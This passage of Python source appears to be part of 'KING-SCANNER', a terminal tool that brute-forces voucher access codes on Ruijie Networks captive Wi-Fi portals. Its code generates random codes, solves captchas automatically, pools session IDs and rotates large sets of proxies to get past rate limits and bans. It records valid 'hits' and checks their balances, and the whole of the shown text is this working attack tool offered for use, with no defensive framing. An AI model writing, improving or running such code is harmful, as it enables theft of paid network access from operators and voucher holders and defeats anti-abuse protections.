                ud['valid_codes'].append(hit)
                ud['dash_update_event'].set()
                logon = (h3 or {}).get('logon_url') or ''
                asyncio.create_task(check_balance(logon, code, user_id, current_proxy,
                                                  current_session_id, balance_base))
                return {'status': 'hit', 'code': code, 'auth_code': new_code}
            if c3 != 'captcha':
                return _apply_classification(ud, c3, code, current_proxy, new_code)
        ud['stats']['wrong'] += 1
        return {'status': 'wrong', 'code': code}
    return _apply_classification(ud, classification, code, current_proxy, auth_code)

def _apply_classification(ud, classification, code, proxy, auth_code):
    if classification == 'expired':
        ud['stats']['expired'] += 1
        return {'status': 'expired', 'code': code, 'auth_code': auth_code}
    if classification == 'limit':
        ud['stats']['limits'] += 1
        return {'status': 'limit', 'code': code, 'auth_code': auth_code}
    if classification == 'error':
        return {'status': 'error', 'code': code, 'auth_code': auth_code, 'network': True}
    ud['stats']['wrong'] += 1
    return {'status': 'wrong', 'code': code, 'auth_code': auth_code}

async def sid_refresher(user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    base = 'https://portal-as.ruijienetworks.com'
    if ud.get('portal_url'):
        try:
            p = urlparse(ud['portal_url'])
            if p.scheme and p.netloc: base = f"{p.scheme}://{p.netloc}"
        except Exception: pass
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json', 'Origin': base,
        'Referer': f'{base}/download/static/maccauth/src/index.html',
    }
    sem = get_global_sem()
    consecutive_fail = 0

    async def make_sid():
        nonlocal consecutive_fail
        async with sem:
            for _ in range(5):
                if ud['stop_event'].is_set(): return
                proxy = await pm.get_next()
                if proxy is None: continue
                session = aiohttp.ClientSession(
                    connector=create_connector_for_proxy(proxy),
                    connector_owner=True,
                    timeout=aiohttp.ClientTimeout(total=10))
                try:
                    sid, source = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                    if not sid:
                        consecutive_fail += 1; continue
                    captcha_base = f'{base}/api/auth/captcha/image'
                    verify_url = f'{base}/api/auth/captcha/verify'
                    auth = None
                    captcha_url = captcha_base + '?sessionId=' + sid
                    for _ in range(2):
                        code = await solve_captcha_simple_async(session, captcha_url, headers)
                        if not code: continue
                        try:
                            async with session.post(verify_url,
                                                    json={'sessionId': sid, 'authCode': code},
                                                    headers=headers, ssl=False,
                                                    timeout=aiohttp.ClientTimeout(total=6)) as vr:
                                vd = await vr.json()
                        except Exception: vd = {}
                        if isinstance(vd, dict) and vd.get('success'):
                            auth = code; break
                    async with ud['sid_lock']:
                        if sid in ud['sid_time']: return
                        ud['sid_pool'].append(sid)
                        ud['sid_time'][sid] = time.time()
                        ud['sid_sem'][sid] = asyncio.Semaphore(15)
                        ud['sid_created'] = ud.get('sid_created', 0) + 1
                        consecutive_fail = 0
                        if auth: ud['sid_auth'][sid] = auth
                    try: ud['sid_event'].set(); ud['dash_update_event'].set()
                    except Exception: pass
                    return
                except Exception:
                    consecutive_fail += 1; continue
                finally:
                    try: await session.close()
                    except Exception: pass
                    if proxy and proxy != DIRECT:
                        try: await pm.release(proxy)
                        except Exception: pass

    while not ud['stop_event'].is_set():
        try:
            if ud['portal_url'] is None:
                await asyncio.sleep(0.5); continue
            target = ud['sid_target']
            cur_len = len(ud['sid_pool'])
            if cur_len >= target:
                await asyncio.sleep(5); continue
            now = time.time()
            if (now - ud['_last_cleanup']) > 60:
                ud['_last_cleanup'] = now
                async with ud['sid_lock']:
                    fresh, fresh_set = [], set()
                    for s in ud['sid_pool']:
                        if now - ud['sid_time'].get(s, 0) < SID_TTL:
                            fresh.append(s); fresh_set.add(s)
                        else:
                            ud['sid_auth'].pop(s, None); ud['sid_time'].pop(s, None)
                            ud['sid_sem'].pop(s, None)
                    ud['sid_pool'] = fresh
                    for s in list(ud['sid_sem'].keys()):
                        if s not in fresh_set: ud['sid_sem'].pop(s, None)
            if len(ud['sid_pool']) >= target:
                await asyncio.sleep(5); continue
            if consecutive_fail >= 30:
                await asyncio.sleep(15); consecutive_fail = 0; continue
            min_sids = max(10, int(target * SID_POOL_MIN_RATIO))
            batch_size = max(5, int(target * SID_BATCH_SIZE_RATIO))
            pool_size = len(ud['sid_pool'])
            need = target - pool_size
            batch = min(need, batch_size)
            if pool_size < min_sids: batch = min(need, batch_size * 2)
            if pool_size == 0: batch = min(need, batch_size * 3)
            await asyncio.gather(*[make_sid() for _ in range(batch)], return_exceptions=True)
            await asyncio.sleep(0.15)
        except asyncio.CancelledError: return
        except Exception: await asyncio.sleep(1.0)

async def worker(worker_id, login_url, captcha_base_url, verify_url,
                 headers, user_id, balance_base):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    global_sem = get_global_sem()
    session = None; proxy = None; current_sid = None
    codes_on_sid = 0
    await asyncio.sleep(_RNG.uniform(0, STARTUP_STAGGER_MAX))
    try:
        while not ud['stop_event'].is_set():
            try:
                if current_sid is None:
                    pool = ud['sid_pool']
                    if not pool:
                        try: ud['sid_event'].clear()
                        except Exception: pass
                        try: await asyncio.wait_for(ud['sid_event'].wait(), timeout=1.5)
                        except asyncio.TimeoutError: pass
                        continue
                    current_sid = _RNG.choice(pool)
                sid_sem = ud['sid_sem'].get(current_sid)
                if sid_sem is None:
                    async with ud['sid_lock']:
                        sid_sem = ud['sid_sem'].get(current_sid)
                        if sid_sem is None:
                            sid_sem = asyncio.Semaphore(15)
                            ud['sid_sem'][current_sid] = sid_sem
                if session is None:
                    proxy = await pm.get_next()
                    if not proxy:
                        await asyncio.sleep(0.05); continue
                    ban_until = ud['proxy_banned_until'].get(proxy, 0)
                    if ban_until > time.time():
                        await pm.mark_limited(proxy, ban_until - time.time())
                        proxy = await pm.get_next()
                        if not proxy: await asyncio.sleep(0.05); continue
                    try:
                        session = aiohttp.ClientSession(
                            connector=create_connector_for_proxy(proxy),
                            connector_owner=True,
                            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC))
                    except Exception:
                        session = None; proxy = None
                        await asyncio.sleep(0.05); continue
                await rps_gate()
                if _RNG.random() < 0.02: await breathing_gate()
                acquired_sid = False
                try:
                    await asyncio.wait_for(sid_sem.acquire(), timeout=0.6)
                    acquired_sid = True
                except asyncio.TimeoutError:
                    await asyncio.sleep(0.005); continue
                acquired_global = False
                try:
                    try:
                        await asyncio.wait_for(global_sem.acquire(), timeout=2.0)
                        acquired_global = True
                    except asyncio.TimeoutError: continue
                    if codes_on_sid >= MAX_CODES_PER_SESSION:
                        if current_sid in ud['sid_time']:
                            async with ud['sid_lock']:
                                ud['sid_auth'].pop(current_sid, None)
                                ud['sid_time'].pop(current_sid, None)
                                ud['sid_sem'].pop(current_sid, None)
                        current_sid = None; codes_on_sid = 0
                        try: await session.close()
                        except Exception: pass
                        if proxy: await pm.release(proxy)
                        session = None; proxy = None; continue
                    mode = ud['mode']
                    if mode == 'custom' and ud['start_digit']:
                        code = ud['start_digit'] + ''.join(_RNG.choices(ud['char_set'], k=ud['code_len'] - 1))
                    elif mode == 'customend' and ud.get('end_digit'):
                        code = ''.join(_RNG.choices(ud['char_set'], k=ud['code_len'] - 1)) + ud['end_digit']
                    else:
                        code = ''.join(_RNG.choices(ud['char_set'], k=ud['code_len']))
                    if code in ud['tried_codes']: continue
                    ud['tried_codes'].add(code)
                    ud['CURRENT_CODE'] = code
                    ud['stats']['tried'] += 1
                    ud['dash_update_event'].set()
                    auth_code = ud['sid_auth'].get(current_sid)
                    try:
                        result = await check_single_access_code(
                            session, code, current_sid, login_url, captcha_base_url,
                            verify_url, headers, user_id, proxy, auth_code, balance_base)
                    except Exception:
                        result = {'status': 'net_fail', 'code': code, 'network': True}
                        ud['stats']['failed'] += 1
                    codes_on_sid += 1
                    if result.get('auth_code'):
                        async with ud['sid_lock']:
                            ud['sid_auth'][current_sid] = result['auth_code']
                    st = result['status']
                    if st == 'hit':
                        ud['per_proxy_fails'].pop(proxy, None)
                        ud['proxy_banned_until'].pop(proxy, None)
                    if st == 'limit':
                        if current_sid:
                            async with ud['sid_lock']:
                                ud['sid_auth'].pop(current_sid, None)
                                ud['sid_time'].pop(current_sid, None)
                                ud['sid_sem'].pop(current_sid, None)
                        current_sid = None; codes_on_sid = 0
                        await pm.mark_limited(proxy, 15.0)
                finally:
                    if acquired_global:
                        try: global_sem.release()
                        except Exception: pass
                    if acquired_sid and sid_sem is not None:
                        try: sid_sem.release()
                        except Exception: pass
                if WORKER_JITTER_MS > 0:
                    await asyncio.sleep(_RNG.uniform(0, WORKER_JITTER_MS / 1000.0))
            except asyncio.CancelledError: break
            except Exception:
                try:
                    if session: await session.close()
                except Exception: pass
                if proxy:
                    try: await pm.release(proxy)
                    except Exception: pass
                session = None; proxy = None; current_sid = None
                await asyncio.sleep(0.08)
    except asyncio.CancelledError: pass
    finally:
        if session is not None:
            try: await asyncio.wait_for(session.close(), timeout=1.0)
            except Exception: pass
            if proxy:
                try: await pm.release(proxy)
                except Exception: pass

async def worker_supervisor(user_id, worker_args):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud['stop_event'].is_set():
        try:
            proxy_total, proxy_active = pm.stats()
            working = max(proxy_active - DIRECT_SLOTS, 1)
            user_target = ud['worker_target']
            sid_count = max(len(ud['sid_pool']), 1)
            sid_capacity = sid_count * 15
            auto_target = min(working * WORKERS_PER_PROXY, sid_capacity)
            target = min(user_target, auto_target)
            if _REPLIT_ENV: target = min(target, 800)
            target = max(20, target)
            wd = ud['worker_dict']
            dead = [wid for wid, t in wd.items() if t.done()]
            for wid in dead: wd.pop(wid, None)
            current = len(wd)
            if current < target:
                for _ in range(target - current):
                    wid = ud['worker_counter']; ud['worker_counter'] += 1
                    wd[wid] = asyncio.create_task(worker(wid, *worker_args))
            elif current > target:
                for wid in list(wd.keys())[-(current - target):]:
                    t = wd.pop(wid, None)
                    if t and not t.done(): t.cancel()
            await asyncio.sleep(3)
        except asyncio.CancelledError: break
        except Exception: await asyncio.sleep(2)
    for t in list(ud['worker_dict'].values()):
        if t and not t.done(): t.cancel()
    ud['worker_dict'] = {}

async def proxy_health_check(user_id, once=False):
    pm = get_proxy_manager()
    ud = get_user_data(user_id)
    base = 'https://portal-as.ruijienetworks.com'
    if ud.get('portal_url'):
        try:
            p = urlparse(ud['portal_url'])
            if p.scheme and p.netloc: base = f"{p.scheme}://{p.netloc}"
        except Exception: pass
    ping_url = f'{base}/api/auth/captcha/image?sessionId=hc'
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36'}
    sem = asyncio.Semaphore(60 if _REPLIT_ENV else 200)
    fail_count = {}
    async def check_one(p):
        async with sem:
            try:
                conn = ProxyConnector.from_url(p, ssl=False)
                async with aiohttp.ClientSession(connector=conn) as s:
                    async with s.get(ping_url, headers=headers, timeout=6, ssl=False) as r:
                        await r.read(); return r.status < 500
            except Exception: return False
    async def check(p):
        if p == DIRECT: return (p, True)
        for _ in range(2):
            if await check_one(p): return (p, True)
            await asyncio.sleep(0.2)
        return (p, False)
    while True:
        proxies = list(pm.proxies)
        if proxies:
            chunk = 300
            for i in range(0, len(proxies), chunk):
                if ud['stop_event'].is_set(): return
                sub = proxies[i:i+chunk]
                results = await asyncio.gather(*[check(p) for p in sub])
                async with pm.lock:
                    for p, ok in results:
                        if ok:
                            pm.bad_proxies.discard(p); fail_count.pop(p, None)
                        else:
                            fail_count[p] = fail_count.get(p, 0) + 1
                            if fail_count[p] >= 3: pm.bad_proxies.add(p)
        if once or ud['stop_event'].is_set(): return
        await asyncio.sleep(90 if not _REPLIT_ENV else 120)

def _render_dashboard(ud, pm):
    stats = ud['stats']
    elapsed = max(time.time() - stats['start_time'], 0.001)
    speed_cps = stats['tried'] / elapsed
    proxy_total, proxy_active = pm.stats()
    pool_size = len(ud['sid_pool'])
    out = []
    out.append(double_hr(BMAG))
    out.append(f"     {BRED}██╗  ██╗██╗███╗   ██╗ ██████╗ {RST}")
    out.append(f"     {BYLW}██║ ██╔╝██║████╗  ██║██╔════╝ {RST}")
    out.append(f"     {BGRN}█████╔╝ ██║██╔██╗ ██║██║  ███╗{RST}")
    out.append(f"     {BCYN}██╔═██╗ ██║██║╚██╗██║██║   ██║{RST}")
    out.append(f"     {BBLU}██║  ██╗██║██║ ╚████║╚██████╔╝{RST}")
    out.append(f"     {BMAG}╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ {RST}")
    out.append(double_hr(BMAG))
    out.append(f"{BYLW}⚡ SPEED: {speed_cps:6.1f} c/s{RST}   {DIM}|{RST}   {BMAG}👑 Owner : {BWHT}{OWNER_NAME}{RST}")
    out.append(f"{BCYN}🔍 TRIED  : {BWHT}{stats['tried']:,}{RST}")
    out.append(f"{BWHT}📌 CURRENT: {BYLW}{ud['CURRENT_CODE']}{RST}")
    out.append(f"{DIM}[PRESS ENTER TO RETURN]{RST}")
    out.append(hr('━', 58, BCYN))
    out.append(f"{BGRN}🟢 HITS    : {BWHT}{stats['hits']}{RST}")
    out.append(f"{BMAG}🟣 EXPIRED : {BWHT}{stats['expired']}{RST}")
    out.append(f"{BCYN}🔵 LIMITS  : {BWHT}{stats['limits']}{RST}")
    out.append(f"{BWHT}🛠  PROXIES : {BYLW}{proxy_active}{BWHT}/{proxy_total}{RST}")
    out.append(hr('━', 58, BCYN))
    if ud['valid_codes']:
        codes_line = ", ".join(item['code'] for item in ud['valid_codes'][-12:])
        out.append(f"{BGRN}✨ Valid Active Now:{RST} {BYLW}{codes_line}{RST}")
    else:
        out.append(f"{DIM}Valid Active Now: none yet{RST}")
    out.append(hr('━', 58, BCYN))
    if ud['valid_codes']:
        for item in ud['valid_codes'][-10:]:
            code = item['code']
            bal = item.get('balance_str', '...fetching...')
            if bal in ('--', '...', '...fetching...'): bal_disp = '⏳'
            else: bal_disp = bal
            out.append(f"{BGRN}[+] HIT:{RST} {BYLW}{code}{RST} {DIM}|{RST} {BWHT}{bal_disp}{RST}")
    else:
        out.append(f"{DIM}  No hits yet... scanning...{RST}")
    out.append(hr('━', 58, BCYN))
    target_sid = ud['sid_target']
    sid_pct = min(100, int(pool_size * 100 / target_sid))
    bar_len = 24
    filled = int(bar_len * pool_size / target_sid)
    bar = f"{BGRN}{'█' * filled}{DIM}{'░' * (bar_len - filled)}{RST}"
    out.append(f"{BCYN}🏄 SID: {BWHT}{pool_size}{BCYN}/{BWHT}{target_sid} {BCYN}[{bar}{BCYN}] {BYLW}{sid_pct}%{RST}")
    return "\n".join(out)

async def live_dashboard_updater(user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    last_render = 0.0
    while not ud['stop_event'].is_set():
        now = time.time()
        if now - last_render < 0.5:
            await asyncio.sleep(0.2); continue
        last_render = now
        clear_screen()
        print(_render_dashboard(ud, pm))
        sys.stdout.flush()
        ud['dash_update_event'].clear()
        try: await asyncio.wait_for(ud['dash_update_event'].wait(), timeout=1.0)
        except asyncio.TimeoutError: pass

def start_input_listener(ud):
    try: loop = asyncio.get_running_loop()
    except RuntimeError: return
    def reader():
        try: input()
        except Exception: pass
        try:
            loop.call_soon_threadsafe(ud['stop_event'].set)
            loop.call_soon_threadsafe(ud['dash_update_event'].set)
        except Exception: pass
    threading.Thread(target=reader, daemon=True).start()

def _api_base(portal_url):
    if not portal_url: return 'https://portal-as.ruijienetworks.com'
    try:
        p = urlparse(portal_url)
        if p.scheme and p.netloc: return f"{p.scheme}://{p.netloc}"
    except Exception: pass
    return 'https://portal-as.ruijienetworks.com'

async def run_scanner(user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    if proxy_total == 0 or proxy_active == 0:
        print(BRED + '⚠️ No proxies loaded!' + RST)
        return
    base = _api_base(ud['portal_url'])
    login_url = f'{base}/api/auth/voucher/?lang=en_US'
    captcha_base_url = f'{base}/api/auth/captcha/image'
    verify_url = f'{base}/api/auth/captcha/verify'
    balance_base = f'{base}/api/auth/balance/getBalance'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Origin': base,
        'Referer': f'{base}/download/static/maccauth/src/index.html',
        'X-Requested-With': 'XMLHttpRequest',
    }
    ud['stop_event'].clear(); ud['dash_update_event'].clear()
    try: ud['sid_event'].clear()
    except Exception: pass
    ud['task'] = asyncio.current_task()
    ud['stats'] = {'tried': 0, 'hits': 0, 'wrong': 0, 'expired': 0,
                   'limits': 0, 'failed': 0, 'start_time': time.time()}
    ud['tried_codes'] = set()
    ud['CURRENT_CODE'] = '----'
    ud['sid_created'] = 0
    ud['worker_dict'] = {}; ud['worker_counter'] = 0
    ud['_last_cleanup'] = time.time()
    ud['per_proxy_fails'] = {}; ud['proxy_banned_until'] = {}
    async with ud['sid_lock']:
        ud['sid_pool'] = []; ud['sid_auth'] = {}
        ud['sid_time'] = {}; ud['sid_sem'] = {}
    set_global_sem_limit(SPEED_PRESETS[ud['speed_preset']]['sem'])
    tasks = [asyncio.create_task(sid_refresher(user_id)) for _ in range(12)]
    print(BCYN + '🧩 Extracting SIDs...' + RST)
    wait_start = time.time()
    min_sids = max(10, int(ud['sid_target'] * SID_POOL_MIN_RATIO))
    while not ud['stop_event'].is_set():
        if len(ud['sid_pool']) >= min_sids: break
        if time.time() - wait_start > 180: break
        await asyncio.sleep(0.5)
    if ud['stop_event'].is_set():
        for t in tasks:
            if not t.done(): t.cancel()
        return
    worker_args = (login_url, captcha_base_url, verify_url, headers, user_id, balance_base)
    tasks.append(asyncio.create_task(worker_supervisor(user_id, worker_args)))
    tasks.append(asyncio.create_task(proxy_health_check(user_id)))
    tasks.append(asyncio.create_task(live_dashboard_updater(user_id)))
    ud['tasks'] = tasks
    start_input_listener(ud)
    try: await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError: pass
    finally:
        ud['stop_event'].set(); ud['dash_update_event'].set()
        for t in tasks:
            if not t.done(): t.cancel()
        try: await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=5)
        except Exception: pass
        ud['tasks'] = []

def print_final_summary(user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    stats = ud['stats']
    elapsed = max(time.time() - stats['start_time'], 0.001)
    speed_cps = stats['tried'] / elapsed
    clear_screen()
    print(double_hr(BRED))
    print_king_logo()
    print(double_hr(BRED))
    print(f"     {BRED}{BLINK}🛑  SCANNER STOPPED{RST}")
    print(double_hr(BRED))
    print(f"  {BMAG}👑 Owner      : {BWHT}{OWNER_NAME}{RST}")
    print(f"  {BCYN}🔍 Tried      : {BWHT}{stats['tried']:,}{RST}")
    print(f"  {BGRN}🟢 Hits       : {BWHT}{stats['hits']}{RST}")
    print(f"  {BMAG}🟣 Expired    : {BWHT}{stats['expired']}{RST}")
    print(f"  {BCYN}🔵 Limits     : {BWHT}{stats['limits']}{RST}")
    print(f"  {BYLW}⚡ Speed      : {BWHT}{speed_cps:.2f} c/s{RST}")
    print(f"  {BWHT}🛠  Proxies    : {BYLW}{proxy_active}/{proxy_total}{RST}")
    print(f"  {BCYN}🏄 SID Created: {BWHT}{ud.get('sid_created', 0)}{RST}")
    print(hr('━', 58, BGRN))
    print(f"  {BGRN}📋 ALL HIT CODES:{RST}")
    if ud['valid_codes']:
        for item in ud['valid_codes']:
            bal = item.get('balance_str', '...')
            if bal in ('--', '...', '...fetching...'): bal = '⏳'
            print(f"    {BGRN}[+] HIT:{RST} {BYLW}{item['code']}{RST} {DIM}|{RST} {BWHT}{bal}{RST}")
    else:
        print(f"    {DIM}None{RST}")
    print(double_hr(BRED))

def print_menu():
    ud = get_user_data(TERMINAL_USER_ID)
    pm = get_proxy_manager()
    total, active = pm.stats()
    proxy_color = BGRN if active > 0 else BRED
    clear_screen()
    print(double_hr(BMAG))
    print_king_logo()
    print(double_hr(BMAG))
    print(f"  {DIM}         ⚡ KING-SCANNER · TERMINAL EDITION ⚡{RST}")
    print(double_hr(BMAG))
    print(f"  {BYLW}┌───────────────────────────────────────────────┐{RST}")
    print(f"  {BYLW}│{RST}  {BMAG}👑  Owner   :{RST}  {BWHT}{OWNER_NAME:<28}{RST}{BYLW}│{RST}")
    print(f"  {BYLW}│{RST}  {BCYN}🔀  Proxies :{RST}  {proxy_color}{active}{BWHT}/{total:<24}{RST}{BYLW}│{RST}")
    print(f"  {BYLW}└───────────────────────────────────────────────┘{RST}")
    print(hr('━', 58, BCYN))
    print(f"  {BG_GRN}{BLK}  1  {RST}  {BGRN}🚀  Start Scan{RST}")
    print(f"  {BG_MAG}{BWHT}  2  {RST}  {BMAG}➕  Add Proxies{RST}")
    print(f"  {BG_CYN}{BLK}  3  {RST}  {BCYN}📡  Mega Fetch 10k{RST}")
    print(f"  {BG_BLU}{BWHT}  4  {RST}  {BBLU}🧹  Clear Dead{RST}")
    print(hr('━', 58, BMAG))
    print(f"  {BG_RED}{BWHT}  0  {RST}  {BRED}🚪  Exit{RST}")
    print(double_hr(BMAG))

def handle_proxy_input():
    clear_screen()
    print(double_hr(BMAG))
    print_king_logo()
    print(double_hr(BMAG))
    print(f"  {BMAG}✦ {BWHT}ADD PROXIES{BMAG} ✦{RST}")
    print(double_hr(BMAG))
    print(f"  {DIM}Paste one per line. Empty line to finish.{RST}")
    print(f"  {DIM}e.g.  1.2.3.4:8080   socks5://u:p@host:1080{RST}")
    print(hr('━', 58, BCYN))
    lines = []
    try:
        while True:
            line = input(f"  {BCYN}➤{RST} ").strip()
            if not line: break
            lines.append(line)
    except (KeyboardInterrupt, EOFError): pass
    if not lines:
        print(BRED + "\n  ❌ No proxies entered." + RST)
        time.sleep(1.0); return
    try:
        with open(PROXY_FILE, 'a') as f:
            f.write('\n'.join(lines) + '\n')
        pm = get_proxy_manager()
        pm.reload()
        t, a = pm.stats()
        print(BGRN + f"\n  ✅ Saved {len(lines)} proxies. Active: {BWHT}{a}{BGRN}/{t}" + RST)
    except Exception as e:
        print(BRED + f"\n  ❌ Save failed: {e}" + RST)
    time.sleep(1.3)

def do_mega_fetch():
    clear_screen()
    print(double_hr(BMAG))
    print_king_logo()
    print(double_hr(BMAG))
    print(f"  {BMAG}✦ {BWHT}MEGA FETCH 10K PROXIES{BMAG} ✦{RST}")
    print(double_hr(BMAG))
    print(f"  {BG_GRN}{BLK} 1 {RST} {BGRN}ALL (10k){RST}    {BG_CYN}{BLK} 2 {RST} {BCYN}SOCKS5{RST}    "
          f"{BG_BLU}{BWHT} 3 {RST} {BBLU}HTTP{RST}    {BG_MAG}{BWHT} 4 {RST} {BMAG}SOCKS4{RST}")
    print(double_hr(BMAG))
    try: choice = input(f"  {BCYN}➤ Select:{RST} ").strip()
    except (KeyboardInterrupt, EOFError): return
    proto_map = {'1': 'all', '2': 'socks5', '3': 'http', '4': 'socks4'}
    protocol = proto_map.get(choice, 'all')
    print(BYLW + f"\n  📡 Fetching {protocol.upper()}... this takes 1-3 min" + RST)
    try:
        added, source, err = asyncio.run(fetch_online_proxies(protocol))
        pm = get_proxy_manager()
        pt, pa = pm.stats()
        if err:
            print(BRED + f"\n  ❌ {err}" + RST)
        else:
            print(BGRN + f"\n  ✅ Added: {added} | Pool: {pa}/{pt}" + RST)
    except Exception as e:
        print(BRED + f"\n  ❌ {type(e).__name__}: {e}" + RST)
    input(f"\n  {DIM}Press ENTER...{RST}")

def do_clear_dead():
    pm = get_proxy_manager()
    removed = pm.clear_dead()
    t, a = pm.stats()
    clear_screen()
    print(double_hr(BMAG))
    print_king_logo()
    print(double_hr(BMAG))
    print(BGRN + f"  ✅ Removed: {removed} | Remaining: {a}/{t}" + RST)
    time.sleep(1.3)

def ask_portal_url():
    ud = get_user_data(TERMINAL_USER_ID)
    ud['portal_url'] = None
    clear_screen()
    print(double_hr(BMAG))
    print_king_logo()
    print(double_hr(BMAG))
    print(f"  {BMAG}✦ {BWHT}STEP 1 / 2 — PORTAL URL{BMAG} ✦{RST}")
    print(double_hr(BMAG))
    print(f"  {BYLW}⚠️  Start Scan တိုင်း URL အသစ် ထည့်ရပါမယ်{RST}")
    print(hr('━', 58, BCYN))
    try: url = input(f"  {BCYN}➤ URL:{RST} ").strip()
    except (KeyboardInterrupt, EOFError): return False
    if not url or not url.startswith('http'):
        print(BRED + "\n  ❌ URL မှန်ကန်အောင် ထည့်ပါ (http://...)" + RST)
        time.sleep(1.5); return False
    ud['portal_url'] = url
    try:
        lines = []
        if os.path.exists(FILE_PATH):
            with open(FILE_PATH, 'r') as f:
                for line in f.readlines():
                    if not line.startswith(PORTAL_URL_PATH + str(TERMINAL_USER_ID) + ' '):
                        lines.append(line)
        lines.append(f"{PORTAL_URL_PATH}{TERMINAL_USER_ID} {url}\n")
        with open(FILE_PATH, 'w') as f: f.writelines(lines)
    except Exception: pass
    print(BGRN + f"\n  ✅ Portal URL saved!" + RST)
    time.sleep(1.2)
    return True

def ask_mode():
    ud = get_user_data(TERMINAL_USER_ID)
    NUM = '012345678'
    ABC = 'abcdefghijkmnpqrstuvwxyz'
    MIX = '2345678abcdefghijkmnpqrstuvwxyz'
    clear_screen()
    print(double_hr(BMAG))
    print_king_logo()
    print(double_hr(BMAG))
    print(f"  {BMAG}✦ {BWHT}STEP 2 / 2 — PICK CODE TYPE{BMAG} ✦{RST}")
    print(double_hr(BMAG))
    print(f"  {BG_GRN}{BLK} 01 {RST} {BGRN}num6{RST}    {BG_GRN}{BLK} 02 {RST} {BGRN}num7{RST}    "
          f"{BG_GRN}{BLK} 03 {RST} {BGRN}num8{RST}    {BG_GRN}{BLK} 04 {RST} {BGRN}num9{RST}")
    print(f"  {BG_CYN}{BLK} 05 {RST} {BCYN}abc6{RST}    {BG_CYN}{BLK} 06 {RST} {BCYN}abc7{RST}    "
          f"{BG_CYN}{BLK} 07 {RST} {BCYN}abc8{RST}    {BG_CYN}{BLK} 08 {RST} {BCYN}abc9{RST}")
    print(f"  {BG_MAG}{BWHT} 09 {RST} {BMAG}mix6{RST}    {BG_MAG}{BWHT} 10 {RST} {BMAG}mix7{RST}    "
          f"{BG_MAG}{BWHT} 11 {RST} {BMAG}mix8{RST}    {BG_MAG}{BWHT} 12 {RST} {BMAG}mix9{RST}")
    print(hr('━', 58, BCYN))
    print(f"  {BG_YLW}{BLK} 13 {RST} {BYLW}Custom Start Digit{RST}")
    print(f"  {BG_YLW}{BLK} 14 {RST} {BYLW}Custom End Digit{RST}")
    print(double_hr(BMAG))
    try: choice = input(f"  {BCYN}➤ Select:{RST} ").strip()
    except (KeyboardInterrupt, EOFError): return False
    mapping = {
        '1': ('num6', NUM, 6), '01': ('num6', NUM, 6),
        '2': ('num7', NUM, 7), '02': ('num7', NUM, 7),
        '3': ('num8', NUM, 8), '03': ('num8', NUM, 8),
        '4': ('num9', NUM, 9), '04': ('num9', NUM, 9),
        '5': ('abc6', ABC, 6), '05': ('abc6', ABC, 6),
        '6': ('abc7', ABC, 7), '06': ('abc7', ABC, 7),
        '7': ('abc8', ABC, 8), '07': ('abc8', ABC, 8),
        '8': ('abc9', ABC, 9), '08': ('abc9', ABC, 9),
        '9': ('mix6', MIX, 6), '09': ('mix6', MIX, 6),
        '10': ('mix7', MIX, 7), '11': ('mix8', MIX, 8), '12': ('mix9', MIX, 9),
    }
    if choice in mapping:
        ud['mode'], ud['char_set'], ud['code_len'] = mapping[choice]
        ud['start_digit'] = None; ud['end_digit'] = None
        print(BGRN + f"\n  ✅ Mode → {ud['mode']}" + RST)
        time.sleep(0.7); return True
    elif choice == '13':
        try:
            d = input(f"  {BYLW}Start digit (0-9):{RST} ").strip()
            if d.isdigit() and len(d) == 1:
                length = input(f"  {BYLW}Length (6/7/8/9):{RST} ").strip()
                if length in ('6', '7', '8', '9'):
                    ud['mode'] = 'custom'; ud['start_digit'] = d; ud['end_digit'] = None
                    ud['char_set'] = NUM; ud['code_len'] = int(length)
                    print(BGRN + f"\n  ✅ Custom Start = {d}, len = {length}" + RST)
                    time.sleep(0.7); return True
        except (KeyboardInterrupt, EOFError): return False
    elif choice == '14':
        try:
            d = input(f"  {BYLW}End digit (0-9):{RST} ").strip()
            if d.isdigit() and len(d) == 1:
                length = input(f"  {BYLW}Length (6/7/8/9):{RST} ").strip()
                if length in ('6', '7', '8', '9'):
                    ud['mode'] = 'customend'; ud['end_digit'] = d; ud['start_digit'] = None
                    ud['char_set'] = NUM; ud['code_len'] = int(length)
                    print(BGRN + f"\n  ✅ Custom End = {d}, len = {length}" + RST)
                    time.sleep(0.7); return True
        except (KeyboardInterrupt, EOFError): return False
    print(BRED + "\n  ❌ Invalid choice." + RST)
    time.sleep(1.0); return False

def start_scan_flow():
    ud = get_user_data(TERMINAL_USER_ID)
    pm = get_proxy_manager()
    if not ask_portal_url(): return
    if not ask_mode(): return
    if pm.stats()[0] == 0:
        print(BRED + "\n  ❌ No proxies loaded. Use [3] Mega Fetch first." + RST)
        time.sleep(1.5); return
    clear_screen()
    print(double_hr(BMAG))
    print_king_logo()
    print(double_hr(BMAG))
    print(f"\n     {BYLW}{BLINK}🚀  STARTING SCAN...{RST}\n")
    print(f"     {DIM}(press ENTER anytime to stop){RST}")
    print(f"\n     {BCYN}Mode: {BYLW}{ud['mode']}{BCYN}  ·  Initializing...{RST}")
    time.sleep(0.8)
    try: asyncio.run(run_scanner(TERMINAL_USER_ID))
    except KeyboardInterrupt: ud['stop_event'].set()
    except Exception as e:
        print(BRED + f"\n  [!] Error: {type(e).__name__}: {e}" + RST)
    finally:
        try: ud['stop_event'].set()
        except Exception: pass
        print_final_summary(TERMINAL_USER_ID)
        ud['portal_url'] = None
